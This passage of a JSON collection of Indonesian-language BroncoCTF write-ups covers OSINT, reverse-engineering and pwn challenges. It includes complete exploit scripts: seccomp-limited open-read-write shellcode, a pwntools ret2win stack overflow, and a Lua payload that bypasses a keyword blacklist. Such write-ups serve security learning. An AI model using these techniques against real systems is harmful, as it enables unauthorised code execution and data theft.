        "content": "Halaman utama dapat diambil dengan:\n\n```bash\ncurl -s https://broncoctf-online-over-sharer.chals.io/\n```\n\nJavaScript pada halaman menunjukkan dua request POST.\n\nTahap pertama:\n\n```javascript\nfetch(\"/check1\", {\n  method: \"POST\",\n  headers: {\"Content-Type\":\"application/json\"},\n  body: JSON.stringify({\n    username,\n    firstDogBreed,\n    gradDate,\n    dogSiblings\n  })\n})\n```\n\nTahap kedua:\n\n```javascript\nfetch(\"/check2\", {\n  method: \"POST\",\n  headers: {\"Content-Type\":\"application/json\"},\n  body: JSON.stringify({\n    username,\n    building,\n    watchFrom,\n    voiceActor\n  })\n})\n```\n\nDengan source ini, kita mengetahui persis informasi OSINT yang harus dikumpulkan."
      },
      {
        "title": "2. Mengumpulkan jawaban tahap pertama",
        "content": "Posting akun memberikan beberapa informasi langsung:\n\n- Blue adalah seekor **basset hound**.\n- Jenna akan lulus pada **Juni 2026**.\n- Blue memiliki **2 saudara**.\n\nPayload tahap pertama:\n\n```json\n{\n  \"username\": \"jenna_and_blue\",\n  \"firstDogBreed\": \"basset hound\",\n  \"gradDate\": \"06/2026\",\n  \"dogSiblings\": \"2\"\n}\n```\n\nRequest:\n\n```bash\ncurl -i -s \\\n  -X POST 'https://broncoctf-online-over-sharer.chals.io/check1' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\n    \"username\":\"jenna_and_blue\",\n    \"firstDogBreed\":\"basset hound\",\n    \"gradDate\":\"06/2026\",\n    \"dogSiblings\":\"2\"\n  }'\n```\n\nTahap ini mengembalikan HTTP `200`, sehingga seluruh jawaban pertama benar."
      },
      {
        "title": "3. Menjawab tahap kedua",
        "content": "### Favorite campus view\n\nPertanyaannya:\n\n```text\nWhat building gives your favorite view of SCU's campus?\n```\n\nDari posting dan pencocokan sudut pandang kampus, jawabannya adalah:\n\n```text\nKenna Hall\n```\n\n### Lokasi Blue saat wisuda\n\nCaption menyebut Blue akan menonton wisuda dari:\n\n```text\ngrandmas house\n```\n\n### Pengisi suara teman berwarna pink\n\nAcara masa kecil yang dimaksud adalah *Blue's Clues*. Teman berwarna pink/ungu adalah Magenta. Pengisi suara aslinya:\n\n```text\nKoyalee Chanda\n```\n\nPayload tahap kedua:\n\n```json\n{\n  \"username\": \"jenna_and_blue\",\n  \"building\": \"Kenna Hall\",\n  \"watchFrom\": \"grandmas house\",\n  \"voiceActor\": \"Koyalee Chanda\"\n}\n```\n\nRequest final:\n\n```bash\ncurl -s \\\n  -X POST 'https://broncoctf-online-over-sharer.chals.io/check2' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\n    \"username\":\"jenna_and_blue\",\n    \"building\":\"Kenna Hall\",\n    \"watchFrom\":\"grandmas house\",\n    \"voiceActor\":\"Koyalee Chanda\"\n  }'\n```\n\nOutput:\n\n```text\nbronco{0v3r5h4r1n6_m4k3s_m3_8lu3}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{0v3r5h4r1n6_m4k3s_m3_8lu3}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-osint-puremagic",
    "title": "Pure Magic",
    "category": "OSINT",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "**Category:** OSINT  \n**Flag:** `bronco{prefire_junkshadow_soldieroffortune88}`",
    "problemDescription": "Challenge ini menggunakan jejak publik dari komunitas Magic: The Gathering. Tiga komponen flag yang harus ditemukan adalah:\n\n```text\nformat_deckarchetype_player\n```\n\nHasil akhirnya:\n\n```text\nprefire_junkshadow_soldieroffortune88\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1. Mengidentifikasi format",
        "content": "Petunjuk challenge mengarah ke periode Modern sebelum perubahan desain kartu yang dikenal dengan istilah `FIRE` dan sebelum masuknya produk Modern Horizons.\n\nQuery yang digunakan:\n\n```text\nMTG format before FIRE design Modern\nretro Modern format pre FIRE\n\"PreFIRE\" Magic the Gathering\n```\n\nNama format yang ditemukan adalah:\n\n```text\nPreFIRE\n```\n\nUntuk flag, penulisannya dinormalisasi menjadi lowercase:\n\n```text\nprefire\n```"
      },
      {
        "title": "2. Menemukan archetype deck",
        "content": "Setelah format diketahui, pencarian dipersempit ke deck dan hasil pertandingan yang berkaitan dengan PreFIRE.\n\nQuery yang berguna:\n\n```text\n\"PreFIRE\" \"Junk Shadow\"\n\"Junk Shadow\" MTG deck\nsite:mtggoldfish.com \"Junk Shadow\"\n```\n\nNama archetype yang cocok adalah:\n\n```text\nJunk Shadow\n```\n\nSpasi dihilangkan agar sesuai dengan format flag:\n\n```text\njunkshadow\n```\n\n`Junk Shadow` merujuk pada shell deck berwarna Abzan/Junk yang menggunakan paket ancaman berbasis pengurangan life seperti strategi Death's Shadow."
      },
      {
        "title": "3. Pivot ke nama pemain",
        "content": "Nama deck kemudian dipakai sebagai pivot untuk mencari pemain yang menggunakannya pada hasil atau halaman deck publik.\n\nQuery:\n\n```text\n\"Junk Shadow\" \"SoldierofFortune88\"\nsite:mtggoldfish.com/player/SoldierofFortune88\n\"SoldierofFortune88\" MTG\n```\n\nHandle pemain yang ditemukan:\n\n```text\nSoldierofFortune88\n```\n\nNormalisasi untuk flag:\n\n```text\nsoldieroffortune88\n```"
      },
      {
        "title": "4. Menggabungkan komponen",
        "content": "Ketiga bagian digabung menggunakan underscore:\n\n```text\nprefire\njunkshadow\nsoldieroffortune88\n```\n\nMenjadi:\n\n```text\nprefire_junkshadow_soldieroffortune88\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{prefire_junkshadow_soldieroffortune88}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-pwn-crabtrap",
    "title": "Crab Trap",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "`crab_trap` menerima maksimal 512 byte shellcode lalu memasang seccomp. Banner menyebut syscall yang lolos hanya `open`, `read`, dan `write`, sehingga payload `execve(\"/bin/sh\")` akan dihentikan.",
    "problemDescription": "`crab_trap` menerima maksimal 512 byte shellcode lalu memasang seccomp. Banner menyebut syscall yang lolos hanya `open`, `read`, dan `write`, sehingga payload `execve(\"/bin/sh\")` akan dihentikan.\n\nPayload AMD64 di `solve.py` menyusun string `flag.txt` pada stack lalu melakukan tiga syscall berikut:\n\n```text\nopen(\"flag.txt\", O_RDONLY)\nread(fd, rsp, 0x80)\nwrite(1, rsp, bytes_read)\n```\n\nAwalnya `/flag` tidak menghasilkan output. Membaca `/proc/self/cmdline` dengan shellcode ORW menunjukkan proses berjalan sebagai `/home/ctf/crab_trap`; pengujian `flag.txt` di working directory kemudian berhasil. Tidak diperlukan shell interaktif atau bypass seccomp.\n\nJalankan:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\n```\n\nOutput:\n\n```text\nbronco{h0w_c4n_mr_kr4b5_c0de}\n```\n\nFlag: `bronco{h0w_c4n_mr_kr4b5_c0de}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport socket\r\n\r\n\r\nHOST = \"0.cloud.chals.io\"\r\nPORT = 34381\r\n\r\n\r\ndef orw_shellcode(path: bytes) -> bytes:\r\n    \"\"\"Build amd64 shellcode for open(path), read(fd), write(1).\"\"\"\r\n    shellcode = bytearray(b\"\\x48\\x31\\xc0\\x50\")  # xor rax, rax; push rax\r\n    encoded = path + b\"\\x00\"\r\n    encoded += b\"\\x00\" * (-len(encoded) % 8)\r\n\r\n    for offset in range(len(encoded) - 8, -1, -8):\r\n        shellcode += b\"\\x48\\xbb\" + encoded[offset : offset + 8]  # mov rbx, chunk\r\n        shellcode += b\"\\x53\"  # push rbx\r\n\r\n    shellcode += (\r\n        b\"\\x48\\x89\\xe7\"  # mov rdi, rsp\r\n        b\"\\x48\\x31\\xf6\"  # xor rsi, rsi\r\n        b\"\\xb0\\x02\\x0f\\x05\"  # open(path, O_RDONLY)\r\n        b\"\\x48\\x89\\xc7\"  # mov rdi, rax\r\n        b\"\\x48\\x89\\xe6\"  # mov rsi, rsp\r\n        b\"\\x31\\xd2\\xb2\\x80\"  # mov rdx, 0x80\r\n        b\"\\x31\\xc0\\x0f\\x05\"  # read(fd, rsp, 0x80)\r\n        b\"\\x48\\x89\\xc2\"  # mov rdx, rax\r\n        b\"\\xbf\\x01\\x00\\x00\\x00\"  # mov edi, 1\r\n        b\"\\xb0\\x01\\x0f\\x05\"  # write(1, rsp, bytes_read)\r\n    )\r\n    return bytes(shellcode)\r\n\r\n\r\ndef recv_until(sock: socket.socket, marker: bytes) -> bytes:\r\n    data = bytearray()\r\n    while marker not in data:\r\n        chunk = sock.recv(4096)\r\n        if not chunk:\r\n            break\r\n        data += chunk\r\n    return bytes(data)\r\n\r\n\r\ndef main() -> None:\r\n    payload = orw_shellcode(b\"flag.txt\")\r\n    with socket.create_connection((HOST, PORT), timeout=10) as sock:\r\n        sock.settimeout(5)\r\n        recv_until(sock, b\"> \")\r\n        # The service executes a line of shellcode after its input read returns.\r\n        sock.sendall(payload + b\"\\n\")\r\n\r\n        output = bytearray()\r\n        try:\r\n            while chunk := sock.recv(4096):\r\n                output += chunk\r\n        except TimeoutError:\r\n            pass\r\n    print(output.decode(\"utf-8\", \"replace\"), end=\"\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{h0w_c4n_mr_kr4b5_c0de}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-pwn-properpwning",
    "title": "Proper Pwning",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge Proper Pwning",
    "problemDescription": "Binary memiliki empat tahap:\n\n1. Gate 1 meminta overwrite variabel lokal agar bernilai nonzero.\n2. Gate 2 meminta overwrite `gate` tanpa merusak `baby_chicken`.\n3. Gate 3 meminta nilai tepat `13371337`.\n4. Treasure room memiliki buffer overflow besar yang dipakai untuk menimpa saved RIP dan lompat ke fungsi `win()`.\n\nTidak ada canary, binary non-PIE, dan fungsi `win()` sudah tersedia. Exploit akhirnya berupa tiga overwrite variabel lokal lalu ret2win.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Proteksi binary",
        "content": "```bash\nchecksec --file=proper\n```\n\nProteksi yang relevan:\n\n```text\nNo canary\nNo PIE\nNX enabled\n```\n\nNX tidak menjadi masalah karena exploit tidak menjalankan shellcode. Kita cukup mengarahkan alur eksekusi ke `win()`."
      },
      {
        "title": "Gate 1",
        "content": "Layout stack:\n\n```text\nbuffer @ rbp-0x110\ngate   @ rbp-0x4\n```\n\nOffset dari awal buffer ke `gate`:\n\n```text\n0x110 - 0x4 = 0x10c = 268\n```\n\nProgram hanya mengecek apakah `gate` bernilai nonzero. Payload:\n\n```python\ngate1 = b\"A\" * 268 + b\"\\x01\"\n```\n\n`gets()` menambahkan terminator NUL setelah byte terakhir. Karena hanya satu byte rendah yang perlu dibuat nonzero, payload tidak perlu menyentuh saved RBP."
      },
      {
        "title": "Gate 2",
        "content": "Layout stack:\n\n```text\nbuffer       @ rbp-0x210\nbaby_chicken @ rbp-0x8\ngate         @ rbp-0x4\n```\n\nOffset ke `baby_chicken`:\n\n```text\n0x210 - 0x8 = 0x208 = 520\n```\n\n`baby_chicken` harus tetap bernilai `41`, lalu `gate` dibuat nonzero:\n\n```python\ngate2 = b\"B\" * 520\ngate2 += p32(41)\ngate2 += b\"\\x01\"\n```\n\nEmpat byte pertama setelah padding memulihkan `baby_chicken`, lalu satu byte berikutnya mengubah `gate`."
      },
      {
        "title": "Gate 3",
        "content": "Layout stack:\n\n```text\nbuffer @ rbp-0x50\ngate   @ rbp-0x4\n```\n\nOffset:\n\n```text\n0x50 - 0x4 = 0x4c = 76\n```\n\nTarget:\n\n```text\n13371337 decimal = 0x00cc07c9\n```\n\nKarena byte paling tinggi bernilai `00`, cukup kirim tiga byte rendah:\n\n```python\ngate3 = b\"C\" * 76 + p32(13371337)[:3]\n```\n\nTerminator NUL dari `gets()` menjadi byte keempat, sehingga nilai akhirnya tepat `0x00cc07c9`.\n\nSetelah gate ketiga terbuka, program membocorkan alamat fungsi `win()`:\n\n```text\nThe treasure is located at 0x...\n```\n\nSolver memakai leak tersebut agar tetap aman walaupun binary dikompilasi ulang."
      },
      {
        "title": "Treasure room",
        "content": "Buffer treasure room berada pada:\n\n```text\nbuffer @ rbp-0x1a70\n```\n\nUkuran buffer:\n\n```text\n0x1a70 = 6768\n```\n\nOffset ke saved RIP:\n\n```text\n6768 byte buffer\n+ 8 byte saved RBP\n= 6776 byte\n```\n\nPayload:\n\n```python\ntreasure = b\"D\" * 6768\ntreasure += b\"E\" * 8\ntreasure += p64(ret)\ntreasure += p64(win)\n```\n\nGadget `ret` tambahan dipakai untuk menjaga alignment stack 16-byte sebelum memasuki `win()`. Tanpa alignment ini, pemanggilan fungsi libc di dalam `win()` dapat gagal pada beberapa environment."
      },
      {
        "title": "Solver",
        "content": "Dependency:\n\n```bash\npython3 -m pip install pwntools\n```\n\nJalankan dari folder yang berisi binary `proper`:\n\n```bash\npython3 solve.py 0.cloud.chals.io 21543\n```\n\nUntuk pengujian lokal:\n\n```bash\npython3 solve.py --local\n```\n\nAlur solver:\n\n```text\nGate 1:\n  268 padding + 0x01\n\nGate 2:\n  520 padding + p32(41) + 0x01\n\nGate 3:\n  76 padding + tiga byte rendah p32(13371337)\n\nTreasure room:\n  6768 padding + saved RBP + ret + win\n```"
      },
      {
        "title": "Output",
        "content": "```text\n<FLAG>bronco{1m_th3_b35t_PWN3r_1n_th3_wh0l3_w1d3_w0r1d}</FLAG>\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport re\r\nimport sys\r\n\r\nfrom pwn import ELF, ROP, context, p32, p64, process, remote\r\n\r\n\r\nFLAG_RE = re.compile(rb\"bronco\\{[^}\\r\\n]+\\}\")\r\n\r\n\r\ndef build_gate_payloads() -> tuple[bytes, bytes, bytes]:\r\n    # gate1:\r\n    # buffer @ rbp-0x110, gate @ rbp-0x4\r\n    # offset = 0x110 - 4 = 268\r\n    #\r\n    # Kirim hanya satu byte nonzero. Terminator NUL dari gets() melengkapi\r\n    # tiga byte sisanya tanpa menyentuh saved RBP.\r\n    gate1 = b\"A\" * 268 + b\"\\x01\"\r\n\r\n    # gate2:\r\n    # buffer       @ rbp-0x210\r\n    # baby_chicken @ rbp-0x8\r\n    # gate         @ rbp-0x4\r\n    #\r\n    # baby_chicken harus tetap 41, lalu gate dibuat nonzero.\r\n    gate2 = b\"B\" * 520 + p32(41) + b\"\\x01\"\r\n\r\n    # gate3:\r\n    # buffer @ rbp-0x50, gate @ rbp-0x4\r\n    # offset = 0x50 - 4 = 76\r\n    #\r\n    # Target 13371337 = 0x00cc07c9. Tiga byte rendah dikirim dan NUL milik\r\n    # gets() menjadi byte paling tinggi.\r\n    gate3 = b\"C\" * 76 + p32(13371337)[:3]\r\n\r\n    return gate1, gate2, gate3\r\n\r\n\r\ndef start_target(args, elf: ELF):\r\n    if args.local:\r\n        return process(elf.path)\r\n\r\n    return remote(args.host, args.port)\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(\r\n        description=\"Solve BroncoCTF Proper Pwning\"\r\n    )\r\n    parser.add_argument(\r\n        \"host\",\r\n        nargs=\"?\",\r\n        default=\"0.cloud.chals.io\",\r\n        help=\"remote host\",\r\n    )\r\n    parser.add_argument(\r\n        \"port\",\r\n        nargs=\"?\",\r\n        type=int,\r\n        default=21543,\r\n        help=\"remote port\",\r\n    )\r\n    parser.add_argument(\r\n        \"--binary\",\r\n        default=\"./proper\",\r\n        help=\"path ke binary challenge\",\r\n    )\r\n    parser.add_argument(\r\n        \"--local\",\r\n        action=\"store_true\",\r\n        help=\"jalankan binary lokal\",\r\n    )\r\n    parser.add_argument(\r\n        \"--debug\",\r\n        action=\"store_true\",\r\n        help=\"aktifkan log debug pwntools\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    context.binary = elf = ELF(args.binary, checksec=False)\r\n    context.log_level = \"debug\" if args.debug else \"error\"\r\n\r\n    gate1, gate2, gate3 = build_gate_payloads()\r\n    io = start_target(args, elf)\r\n\r\n    # Gate 1\r\n    io.sendline(gate1)\r\n    gate1_result = io.recvuntil(b\"Gate 1 opens.\", timeout=5)\r\n    if b\"Gate 1 opens.\" not in gate1_result:\r\n        raise RuntimeError(\"Gate 1 gagal\")\r\n\r\n    # Gate 2\r\n    io.sendline(gate2)\r\n    gate2_result = io.recvuntil(b\"Gate 2 opens.\", timeout=5)\r\n    if b\"Gate 2 opens.\" not in gate2_result:\r\n        raise RuntimeError(\"Gate 2 gagal\")\r\n\r\n    # Gate 3\r\n    io.sendline(gate3)\r\n    gate3_result = io.recvuntil(b\"\\n\", timeout=5)\r\n\r\n    leak_match = re.search(rb\"located at (0x[0-9a-fA-F]+)\", gate3_result)\r\n    if leak_match:\r\n        win = int(leak_match.group(1), 16)\r\n    else:\r\n        # Binary non-PIE, jadi simbol lokal tetap valid sebagai fallback.\r\n        win = elf.symbols[\"win\"]\r\n\r\n    # treasure_room:\r\n    # buffer @ rbp-0x1a70 = 6768 bytes\r\n    # saved RBP berada setelah 6768 byte\r\n    # saved RIP berada pada offset 6768 + 8 = 6776\r\n    #\r\n    # Tambahkan satu gadget ret untuk memperbaiki alignment stack sebelum win().\r\n    ret = ROP(elf).find_gadget([\"ret\"]).address\r\n    treasure = b\"D\" * 6768\r\n    treasure += b\"E\" * 8\r\n    treasure += p64(ret)\r\n    treasure += p64(win)\r\n\r\n    io.sendline(treasure)\r\n    output = io.recvall(timeout=5)\r\n\r\n    match = FLAG_RE.search(output)\r\n    if match is None:\r\n        print(output.decode(\"latin-1\", errors=\"replace\"))\r\n        raise RuntimeError(\"Flag tidak ditemukan pada output\")\r\n\r\n    flag = match.group(0).decode(\"ascii\")\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        main()\r\n    except (EOFError, OSError, RuntimeError) as error:\r\n        print(f\"[-] {error}\", file=sys.stderr)\r\n        raise SystemExit(1)"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{1m_th3_b35t_PWN3r_1n_th3_wh0l3_w1d3_w0r1d}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-pwn-worldshardestestflag",
    "title": "World's Hardestest Flag",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "**Category:** Misc / Roblox  \n**Challenge:** World's Hardestest Flag  \n**Flag:** `bronco{d34th_t0_th3_dehs_f0r3v3r}`",
    "problemDescription": "Challenge ini berupa game Roblox dengan obstacle course yang dipenuhi musuh bernama **Dehnemy**. Secara normal, pemain harus menyelesaikan seluruh level sampai menyentuh objek `WinPad`.\n\nNamun, di dalam game terdapat terminal bernama **Secure Deh-9001 Terminal**. Terminal tersebut menerima kode Lua dari pemain dan mengirimkannya ke server untuk dieksekusi.\n\nDeveloper mencoba mengamankan terminal menggunakan blacklist kata tertentu. Masalahnya, blacklist hanya memeriksa substring pada source code mentah. Operasi yang sama masih dapat dilakukan menggunakan API Roblox lain yang tidak diblokir.\n\nAlih-alih menyelesaikan seluruh obstacle course, objek kemenangan dapat dicari lalu dipindahkan langsung ke karakter pemain.",
    "tools": [],
    "analysis": "Pemeriksaan awal terhadap file:\n\n```bash\nfile mrdeh-hardestest.rbxl\nstrings -a mrdeh-hardestest.rbxl | \\\n    grep -iE 'terminal|winpad|execute|flag|dehnemy|winner'\n```\n\nBeberapa nama penting yang ditemukan:\n\n```text\nSecureDeh9001TerminalScript\nSecureDeh9001Server-Pipeline\nExecuteCode\nWIN\nWinnerPopup\nWinPad\n```\n\nTemuan tersebut menunjukkan bahwa:\n\n1. Terminal memiliki script client.\n2. Input terminal dikirim melalui sebuah `RemoteEvent`.\n3. Terdapat remote function bernama `WIN`.\n4. Kondisi kemenangan berkaitan dengan objek bernama `WinPad`.\n5. Flag ditampilkan melalui GUI `WinnerPopup`.",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> This is Mr. Deh speaking.\n>\n> I've had enough.\n>\n> This.\n>\n> Is.\n>\n> My.\n>\n> Final.\n>\n> Stand.\n>\n> No more client-sided freebies.\n>\n> No more funny business. Your commands get executed on my special SecureDeh9001Server. You still have freedom (questionable), but I stay safe.\n>\n> In fact, I'm even building my own server on top of the original game using the Roblox Engine.\n>\n> (Wait, what?)\n>\n> Also, there's a flag on my super awesome server, but you'll have to beat the game to get it.\n\nFile yang diberikan:\n\n```text\nmrdeh-hardestest.rbxl\n```"
      },
      {
        "title": "Terminal Logic",
        "content": "Script terminal mengambil isi textbox dan melakukan pengecekan blacklist sebelum mengirim kode ke server.\n\nDaftar kata yang diblokir:\n\n```lua\nlocal bannedWords = {\n    \"position\",\n    \"humanoid\",\n    \"destroy\",\n    \"name\",\n    \"typetag\",\n    \"flag\"\n}\n```\n\nPengecekannya hanya menggunakan pencarian substring:\n\n```lua\nlocal function containsBannedWords(input)\n    for _, word in bannedWords do\n        if string.find(string.lower(input), word) then\n            return true\n        end\n    end\n\n    return false\nend\n```\n\nApabila salah satu kata terlarang ditemukan, karakter pemain dibunuh:\n\n```lua\nif containsBannedWords(code) then\n    killPlayer()\n    errorLog.Text = \"AHA! GOT YOU!!!\"\n    return\nend\n```\n\nJika tidak ditemukan, input dikirim ke server:\n\n```lua\nexecuteEvent:FireServer(code)\n```\n\nJadi, perlindungannya bukan sandbox Lua sungguhan. Server tetap mengeksekusi kode pemain, sementara filter hanya melarang beberapa string."
      },
      {
        "title": "Win Condition",
        "content": "Pada script pengendali karakter ditemukan kondisi kemenangan berikut:\n\n```lua\nelseif not (string.match(obj.Name, \"WinPad\") == nil) then\n    local winGui = LocalPlayer.PlayerGui:FindFirstChild(\"Win\")\n    winGui.Enabled = true\n\n    local flag = winFunc:InvokeServer()\n    winGui.WinnerPopup.Flag.Text = \"\" .. flag\nend\n```\n\nAlurnya:\n\n1. Karakter menyentuh objek yang namanya mengandung `WinPad`.\n2. GUI kemenangan diaktifkan.\n3. Client memanggil `WIN:InvokeServer()`.\n4. Server mengembalikan flag.\n5. Flag ditampilkan pada `WinnerPopup`.\n\nFlag tidak disimpan langsung pada client. Karena itu, membuat GUI palsu atau mengubah teks popup tidak cukup. Objek `WinPad` yang asli harus disentuh agar remote kemenangan dipanggil."
      },
      {
        "title": "Blacklist Bypass",
        "content": "Payload biasa seperti berikut tidak dapat digunakan:\n\n```lua\nprint(v.Name)\n```\n\nKata `name` termasuk blacklist.\n\nMengubah posisi seperti ini juga diblokir:\n\n```lua\nv.Position = ...\n```\n\nKata `position` juga termasuk blacklist.\n\nAkan tetapi, nama sebuah Roblox `Instance` dapat diperoleh melalui:\n\n```lua\ntostring(v)\n```\n\nSedangkan lokasi objek dapat diubah menggunakan properti:\n\n```lua\nv.CFrame\n```\n\nKedua cara tersebut tidak mengandung kata yang diblokir.\n\nUntuk mencari objek kemenangan, semua descendant di dalam `workspace` dapat diperiksa:\n\n```lua\nfor _,v in ipairs(workspace:GetDescendants()) do\n    if tostring(v):find(\"WinPad\") then\n        print(v)\n    end\nend\n```\n\nPayload tersebut tidak menggunakan:\n\n```text\nposition\nhumanoid\ndestroy\nname\ntypetag\nflag\n```"
      },
      {
        "title": "Exploitation",
        "content": "Karena server challenge berjalan sebagai single-player, pemain lokal dapat diambil sebagai elemen pertama dari `GetPlayers()`:\n\n```lua\nlocal p = game:GetService(\"Players\"):GetPlayers()[1]\n```\n\nSetelah itu, cari `WinPad` asli dan pindahkan ke pivot karakter:\n\n```lua\nlocal p=game:GetService(\"Players\"):GetPlayers()[1]\n\nfor _,v in ipairs(workspace:GetDescendants()) do\n    if tostring(v):find(\"WinPad\") and v:IsA(\"BasePart\") then\n        v.CFrame=p.Character:GetPivot()\n        break\n    end\nend\n```\n\nPayload final dalam satu baris:\n\n```lua\nlocal p=game:GetService(\"Players\"):GetPlayers()[1] for _,v in ipairs(workspace:GetDescendants()) do if tostring(v):find(\"WinPad\") and v:IsA(\"BasePart\") then v.CFrame=p.Character:GetPivot() break end end\n```\n\nPayload tetap lolos dari blacklist karena tidak mengandung kata terlarang."
      },
      {
        "title": "Exploit Flow",
        "content": "Ketika payload dijalankan:\n\n```text\nTerminal\n   │\n   ├── melakukan pengecekan blacklist\n   │\n   └── ExecuteCode:FireServer(payload)\n                │\n                ▼\n       SecureDeh9001Server\n                │\n                ├── mengeksekusi kode Lua\n                ├── mencari WinPad\n                └── memindahkan WinPad ke karakter\n                              │\n                              ▼\n                     Karakter menyentuh WinPad\n                              │\n                              ▼\n                     WIN:InvokeServer()\n                              │\n                              ▼\n                       Flag ditampilkan\n```\n\nDengan memindahkan `WinPad`, seluruh obstacle course dapat dilewati."
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{d34th_t0_th3_dehs_f0r3v3r}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-rev-cplusplusunplugged",
    "title": "C++ Unplugged",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "- **CTF:** BroncoCTF\n- **Category:** Reverse\n- **Difficulty:** Medium\n- **Flag:** `bronco{i_c@m3_1n_lik3_@_s3gfAult}`",
    "problemDescription": "- **CTF:** BroncoCTF\n- **Category:** Reverse\n- **Difficulty:** Medium\n- **Flag:** `bronco{i_c@m3_1n_lik3_@_s3gfAult}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Temuan Awal",
        "content": "File terlihat seperti C++ yang seluruh keyword dan operatornya diganti judul lagu:\n\n```cpp\nusing namespace std EndGame\n\nvoid updateNum FromTheStart CountingStars Starboy start IsItOverNow BeginAgain\n```\n\nHint menyebut semua judul yang harus diganti dimulai dengan huruf kapital. Token biasa seperti nama fungsi dan variabel tetap dipertahankan.\n\nPotongan di atas menjadi:\n\n```cpp\nusing namespace std;\n\nvoid updateNum(int *start) {\n```"
      },
      {
        "title": "Mapping Token",
        "content": "Mapping utama bisa ditentukan dari posisi sintaksnya:\n\n| Judul lagu | Token C++ |\n|---|---|\n| `EndGame` | `;` |\n| `FromTheStart` | `(` |\n| `IsItOverNow` | `)` |\n| `BeginAgain` | `{` |\n| `EndOfTime` | `}` |\n| `CountingStars` | `int` |\n| `CallItWhatYouWant` | `string` |\n| `Abcdefu` | `char` |\n| `BadIdeaRight` | `bool` |\n| `TruthHurts` | `true` |\n| `FalseGod` | `false` |\n| `ThisIsMe` | `=` |\n| `SameOldLove` | `==` |\n| `SmallerThanThis` | `<` |\n| `Higher` | `>` |\n| `Greedy` | `&&` |\n| `ThisOrThat` | `||` |\n| `WithoutMe` | `-` |\n| `Starboy` | `*` |\n| `BreakUpWithYourGirlfriendImBored` | `/` |\n| `PartOfMe` | `%` |\n| `Mine` | `+=` |\n| `More` | `++` |\n| `PleasePleasePlease` | `if` |\n| `ShouldveSaidNo` | `else` |\n| `DejaVu` | `while` |\n| `GoodForYou` | `for` |\n| `Positions` | `switch` |\n| `CaseClosed` | `case` |\n| `AsItWas` | `default` |\n| `YouBrokeMeFirst` | `break` |\n| `OnMyWay` | `continue` |\n| `ComeBackBeHere` | `return` |\n| `PieceByPiece` | `[` |\n| `FreshOutTheSlammer` | `]` |\n\nBeberapa judul sengaja ditempel:\n\n```text\ncounterMore                    -> counter++\nflag_selector_1WithoutMeWithoutMe -> flag_selector_1--\nSmallerThanThisThisIsMe        -> <=\nHigherThisIsMe                 -> >=\nAbcdefuacters                  -> characters\n```\n\nDua `BreakUpWithYourGirlfriendImBored` yang berdempetan menghasilkan `//`, sehingga teks setelahnya menjadi komentar.\n\nTiga placeholder di array karakter ditulis dengan spasi:\n\n```cpp\n' Starboy ', ' BeginAgain ', ' EndOfTime '\n```\n\nHasil yang dimaksud adalah:\n\n```cpp\n'*', '{', '}'\n```"
      },
      {
        "title": "Output `part1()`",
        "content": "Kondisi awal:\n\n```cpp\nvar1 && var2 > var3\ntrue && 22 > 13\n```\n\nbernilai benar. Selector mulai dari `-4`, ditambah `7`, lalu dikurangi satu:\n\n```text\n-4 + 7 - 1 = 2\n```\n\n`switch` masuk ke `case 2`.\n\n`updateNum(&var5)` mengubah `var5` dari `1` menjadi `7`, sehingga:\n\n```cpp\nsomething = \"bron\";\n```\n\nOutput:\n\n```text\nbron\n```"
      },
      {
        "title": "Output `part2()`",
        "content": "Array karakter:\n\n```cpp\n{'b','#','c','i','u','&','e','@','d','o','p','t','*','3','{','}'}\n```\n\nPemilihan indeks:\n\n```text\n5 % 3 = 2      -> c\ncharacters[9]  -> o\ncharacters[14] -> {\n```\n\nOutput:\n\n```text\nco{\n```"
      },
      {
        "title": "Output `part3()`",
        "content": "Loop `switch` menghasilkan:\n\n```text\ni = 0 -> smallerParts[8]  -> i\ni = 1 -> smallerParts[38] -> _\ni = 2 -> smallerParts[2]  -> c\ni = 3 -> smallerParts[36] -> @\ni = 4 -> smallerParts[12] -> m\ndefault -> smallerParts[29] -> 3\n```\n\nOutput:\n\n```text\ni_c@m3\n```"
      },
      {
        "title": "Output `part4()`",
